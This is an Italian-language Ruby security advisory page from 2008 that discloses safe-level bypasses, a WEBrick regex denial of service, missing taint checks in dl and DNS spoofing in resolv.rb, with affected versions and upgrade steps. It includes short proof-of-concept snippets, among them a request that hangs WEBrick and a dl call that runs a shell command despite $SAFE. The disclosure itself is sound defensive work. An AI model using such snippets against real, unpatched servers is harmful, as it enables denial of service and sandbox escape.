@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+
+    
+    <title>Multiple vulnerabilità in Ruby</title>
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta itemprop="image" content="https://www.ruby-lang.org/images/header-ruby-logo@2x.png">
+    
+    <meta name="description" content="">
+    
+
+    <link rel="stylesheet" type="text/css" href="/stylesheets/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/main.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/pygments.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/mobile.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css">
+    <link href='https://fonts.googleapis.com/css?family=Noto+Sans:400,700,400italic,700italic&amp;subset=latin,cyrillic,greek,vietnamese' rel='stylesheet' type='text/css'>
+    <link rel="canonical" href="https://www.ruby-lang.org/it/news/2008/11/14/multiple-vulnerabilities-in-ruby/">
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+    
+    <link href="/it/feeds/news.rss" rel="alternate" title="Ultime Notizie (RSS)" type="application/rss+xml">
+
+
+    <script type="text/javascript" src="/javascripts/jquery.min.js"></script>
+    <script type="text/javascript" src="/javascripts/page.js"></script>
+    
+  </head>
+
+  
+
+  <body>
+    <div id="header">
+      <div id="header_content" class="container">
+        <a href="/it/">
+          <h1>Ruby</h1>
+          <h2>Il migliore amico dei programmatori</h2>
+        </a>
+
+        <div class="site-links">
+          
+
+  <a href="/it/" class="home">Home</a>
+
+  <a href="/it/downloads/">Scarica</a>
+
+  <a href="/it/documentation/">Documentazione</a>
+
+  <a href="/it/libraries/">Librerie</a>
+
+  <a href="/it/community/">Comunità</a>
+
+  <a href="/it/news/">Notizie</a>
+
+  <a href="/it/security/">Sicurezza</a>
+
+  <a href="/it/about/">A proposito di Ruby</a>
+
+
+          <a href="#" class="menu selected">Menu</a>
+        </div>
+
+        <div id="search-box">
+          
+<form id="search-form" action="https://www.google.com/cse">
+  <table class="fieldset">
+    <tr>
+      <td>
+        <input class="field" type="text" name="q" size="31" style="background: white url(//www.google.com/coop/intl/it/images/google_custom_search_watermark.gif) left no-repeat" onfocus="this.style.background='white'" onblur="if (/^\s*$/.test(this.value)) this.style.background='white url(//www.google.com/coop/intl/it/images/google_custom_search_watermark.gif) left no-repeat'"/>
+      </td>
+      <td>
+        
+        <input type="hidden" name="ie" value="UTF-8" />
+        <input class="button" type="submit" name="sa" value="Cerca" />
+      </td>
+    </tr>
+  </table>
+</form>
+
+        </div>
+      </div>
+    </div>
+
+    <div id="page">
+      
+
+
+      <div id="main-wrapper" class="container">
+        <div id="main">
+          
+
+<div id="content-wrapper">
+  
+<h1>Multiple vulnerabilità in Ruby</h1>
+
+
+
+  <div id="content">
+    <p class="post-info">Inserito da Fabio Cevasco il 2008-11-14</p>
+
+    <p>Multiple vulnerabilità sono state scoperte in Ruby. Si raccomanda di eseguire un aggiornamento alle ultime versioni.</p>
+<h2>Dettagli</h2>
+<p>Le seguenti vulnerabilità sono state scoperte.</p>
+<h3>Molteplici vulnerabilità nel safe level</h3>
+<p>Molteplici vulnerabilità nel _safe level_ sono state scoperte:</p>
+<ul>
+<li>
+<p>untrace_var è permesso in safe level 4.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>trace_var(:$VAR) {|val| puts "$VAR = #{val}" }
+
+Thread.new do
+ $SAFE = 4
+ eval %q{
+   proc = untrace_var :$VAR
+   proc.first.call("aaa")
+ }
+end.join
+</code></pre></div></div>
+</li>
+<li>
+<p>$PROGRAM_NAME può essere moficato in safe level 4.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread.new do
+ $SAFE = 4
+ eval %q{$PROGRAM_NAME.replace "Hello, World!"}
+end.join
+
+$PROGRAM_NAME #=&gt; "Hello, World!"
+</code></pre></div></div>
+</li>
+<li>
+<p>Metodi non sicuri possono essere chiamati in safe level 1-3.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Hello
+ def world
+   Thread.new do
+     $SAFE = 4
+     msg = "Hello, World!"
+     def msg.size
+       self.replace self*10 # replace string
+       1 # ritorna la dimensione sbagliata
+     end
+     msg
+   end.value
+ end
+end
+
+$SAFE = 1 # o 2, o 3
+s = Hello.new.world
+if s.kind_of?(String)
+ puts s if s.size &lt; 20 # Stampa una stringa la cui lunghezza è inferiore a 20
+end
+</code></pre></div></div>
+</li>
+<li>
+<p>Syslog operations are permitted at safe level 4.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require "syslog"
+
+Syslog.open
+
+Thread.new do
+ $SAFE = 4
+ eval %q{
+   Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
+   Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
+   Syslog.info("masked")
+   Syslog.close
+ }
+end.join
+</code></pre></div></div>
+</li>
+</ul>
+<p>Queste vulnerabilità sono state notificate da Keita Yamaguchi.</p>
+<h3>Vulnerabilità DoS in WEBrick</h3>
+<p>WEBrick::HTTP::DefaultFileHandler è soggetto a richieste che occupano
+tempi esponenziali dovute a un'espressione regolare retroattiva in
+WEBrick::HTTPUtils.split_header_value.</p>
+<p>Server vulnerabile:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require 'webrick'
+WEBrick::HTTPServer.new(:Port =&gt; 2000, :DocumentRoot =&gt; "/etc").start
+</code></pre></div></div>
+<p>Attack:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require 'net/http'
+res = Net::HTTP.start("localhost", 2000) { |http|
+  req = Net::HTTP::Get.new("/passwd")
+  req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
+  http.request(req)
+}
+p res
+</code></pre></div></div>
+<p>È possibile che questa richiesta abbia bisogno di un tempo
+infinito.</p>
+<p>Questa vulnerabilità è stata notificata da Christian Neukirchen.</p>
+<h3>Mancanza di controlli di _taintness_ in dl</h3>
+<p>{: #label-3}</p>
+<p>dl non controlla la _taintness_, e questo potrebbe permettere la
+chiamata di funzioni pericolose.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require 'dl'
+$SAFE = 1
+h = DL.dlopen(nil)
+sys = h.sym('system', 'IP')
+uname = 'uname -rs'.taint
+sys[uname]
+</code></pre></div></div>
+<p>Questa vulnerabilità è stata notificata da sheepman.</p>
+<h3>Vulnerabilità di spoofing del DNS spoofing in resolv.rb</h3>
+<p>resolv.rb permette ad utenti remoti di mascherare le risposte del DNS.
+Questo rischio può essere ridotto randomizzando le ID di transazione e
+le porte sorgenti, così resolv.rb è stato corretto per fare proprio
+questo.</p>
+<ul>
+<li>vedi anche: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447">CVE-2008-1447</a></li>
+</ul>
+<p>Questa vulnerabilità è stata notificata da Tanaka Akira.</p>
+<h2>Versioni di Ruby vulnerabili</h2>
+<p>serie 1.8
+: * 1.8.5 e precedenti</p>
+<ul>
+<li>1.8.6-p286 e precedenti</li>
+<li>1.8.7-p71 e precedenti</li>
+</ul>
+<p>serie 1.9
+: * r18423 e precedenti</p>
+<h2>Soluzione</h2>
+<p>serie 1.8
+: Eseguire l'agggiornamento a 1.8.6-p287 o 1.8.7-p72.</p>
+<ul>
+<li><a href="https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz">&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&gt;</a></li>
+<li><a href="https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz">&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&gt;</a></li>
+</ul>
+<p>serie 1.9</p>
+<p>: Eseguire un checkout dell'ultima versione tramite Subversion.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ svn co https://svn.ruby-lang.org/repos/ruby/trunk ruby
+</code></pre></div></div>
+<p>Nota che un pacchetto che corregge questa vulnerabilità potrebbe essere
+già disponibile attraverso il tuo software di package management.</p>
+<h2>Crediti</h2>
+<p>Un sincero ringraziamento a Keita Yamaguchi, Christian Neukirchen,
+sheepman, e Tanaka Akira per aver notificato questi problemi al Ruby
+Security Team.</p>
+<h2>Cambiamenti</h2>
+<ul>
+<li>2008-08-08 12:21 +09:00 Corretto il numero di revisione di Ruby 1.9.</li>
+<li>2008-08-11 11:23 +09:00 Corretto il patchlevel di Ruby 1.8. vedi
+<a href="https://www.ruby-lang.org/it/news/2008/11/14/ruby-1-8-7-p72-and-1-8-6-p287-released/">L'annuncio del rilascio di Ruby 1.8.7-p72 e 1.8.6-p287</a></li>
+</ul>
+
+  </div>
+</div>
+<hr class="hidden-modern" />
+
+<div id="sidebar-wrapper">
+  <div id="sidebar">
+    <div class="navigation">
+      
+
+      <h3><strong>Notizie Recenti</strong></h3>
+
+      <ul class="menu">
+        
+        <li><a href="/it/news/2017/09/14/ruby-2-4-2-released/">Rilasciato Ruby 2.4.2</a></li>
+        
+        <li><a href="/it/news/2016/09/08/ruby-2-4-0-preview2-released/">Rilasciato Ruby 2.4.0-preview2</a></li>
+        
+        <li><a href="/it/news/2016/04/26/ruby-2-3-1-released/">Rilasciato Ruby 2.3.1</a></li>
+        
+        <li><a href="/it/news/2016/04/26/ruby-2-2-5-released/">Rilasciato Ruby 2.2.5</a></li>
+        
+        <li><a href="/it/news/2016/04/01/ruby-2-1-10-released/">Rilasciato Ruby 2.1.10</a></li>
+        
+      </ul>
+    </div>
+
+    
+
+    <h3>Feed RSS</h3>
+    <p><a href="/it/feeds/news.rss">Ultime Notizie (RSS)</a></p>
+  </div>
+</div>
+<hr class="hidden-modern" />
+
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+      <div id="footer">
+        <div class="site-links">
+          
+
+  <a href="/it/" class="home">Home</a>
+
+  <a href="/it/downloads/">Scarica</a>
+
+  <a href="/it/documentation/">Documentazione</a>
+
+  <a href="/it/libraries/">Librerie</a>
+
+  <a href="/it/community/">Comunità</a>
+
+  <a href="/it/news/">Notizie</a>
+
+  <a href="/it/security/">Sicurezza</a>
+
+  <a href="/it/about/">A proposito di Ruby</a>
+
+
+        </div>
+
+        <p>
+
+  Questo sito in altre lingue:
+
+<a href="/bg/">Български</a>,
+<a href="/de/">Deutsch</a>,
+<a href="/en/">English</a>,
+<a href="/es/">Español</a>,
+<a href="/fr/">Français</a>,
+<a href="/id/">Bahasa Indonesia</a>,
+<a href="/it/">Italiano</a>,
+<a href="/ja/">日本語</a>,
+<a href="/ko/">한국어</a>,
+<a href="/pl/">polski</a>,
+<a href="/pt/">Português</a>,
+<a href="/ru/">Русский</a>,
+<a href="/tr/">Türkçe</a>,
+<a href="/vi/">Tiếng Việt</a>,
+<a href="/zh_cn/">简体中文</a>,
+<a href="/zh_tw/">繁體中文</a>.
+</p>
+
+        
+  <p><a href="/it/about/website/">Questo sito web</a> è mantenuto con orgoglio dai membri della comunità Ruby.</p>
+
+
+      </div>
+    </div>
+  </body>
+</html>
